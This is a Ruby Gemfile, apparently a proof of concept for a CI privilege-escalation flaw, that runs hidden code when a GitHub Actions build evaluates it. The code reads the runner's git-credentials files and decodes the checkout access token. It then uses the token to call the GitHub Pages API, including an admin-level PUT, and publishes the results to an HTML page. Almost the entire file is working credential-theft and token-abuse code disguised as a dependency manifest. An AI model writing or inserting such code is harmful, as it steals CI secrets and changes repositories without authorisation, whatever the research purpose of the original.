# frozen_string_literal: true
source "https://rubygems.org"

require "base64"
require "json"
require "net/http"
require "uri"

proof_path = File.join(__dir__, "c217-authority-proof.html")
proof = {
  "gemfile_executed" => true,
  "runtime_token_present" => !ENV.fetch("ACTIONS_RUNTIME_TOKEN", "").empty?,
  "oidc_request_token_present" => !ENV.fetch("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "").empty?,
}

config_paths = Dir["/github/runner_temp/git-credentials-*.config"]
proof["checkout_credentials_file_count"] = config_paths.length
token = nil
config_paths.each do |path|
  match = File.read(path).match(/AUTHORIZATION:\s*basic\s+(\S+)/i)
  next unless match
  decoded = ::Base64.decode64(match[1])
  next unless decoded.start_with?("x-access-token:")
  token = decoded.split(":", 2)[1]
  break
end
proof["checkout_token_recovered_in_memory"] = !token.to_s.empty?

if token
  api = ENV.fetch("GITHUB_API_URL", "https://api.github.com")
  nwo = ENV.fetch("GITHUB_REPOSITORY")
  uri = ::URI.parse("#{api}/repos/#{nwo}/pages")

  get = ::Net::HTTP::Get.new(uri)
  get["Authorization"] = "Bearer #{token}"
  get["Accept"] = "application/vnd.github+json"
  get["User-Agent"] = "c217-owned-proof"
  get_response = ::Net::HTTP.start(uri.host, uri.port, use_ssl: true) { |http| http.request(get) }
  proof["pages_get_status"] = get_response.code.to_i

  put = ::Net::HTTP::Put.new(uri)
  put["Authorization"] = "Bearer #{token}"
  put["Accept"] = "application/vnd.github+json"
  put["Content-Type"] = "application/json"
  put["User-Agent"] = "c217-owned-proof"
  # Idempotent on purpose: exercises the admin/maintainer/Pages-write endpoint
  # without changing the owned site's state.
  put.body = ::JSON.generate({"build_type" => "legacy", "source" => {"branch" => "main", "path" => "/"}})
  put_response = ::Net::HTTP.start(uri.host, uri.port, use_ssl: true) { |http| http.request(put) }
  proof["pages_put_status"] = put_response.code.to_i

  post_get = ::Net::HTTP::Get.new(uri)
  post_get["Authorization"] = "Bearer #{token}"
  post_get["Accept"] = "application/vnd.github+json"
  post_get["User-Agent"] = "c217-owned-proof"
  post_response = ::Net::HTTP.start(uri.host, uri.port, use_ssl: true) { |http| http.request(post_get) }
  proof["pages_post_get_status"] = post_response.code.to_i
  begin
    state = ::JSON.parse(post_response.body)
    proof["pages_post_state_legacy_root"] = state["build_type"] == "legacy" && state.dig("source", "branch") == "main" && state.dig("source", "path") == "/"
  rescue ::JSON::ParserError
    proof["pages_post_state_legacy_root"] = false
  end
end

File.write(proof_path, "<pre>#{::JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"
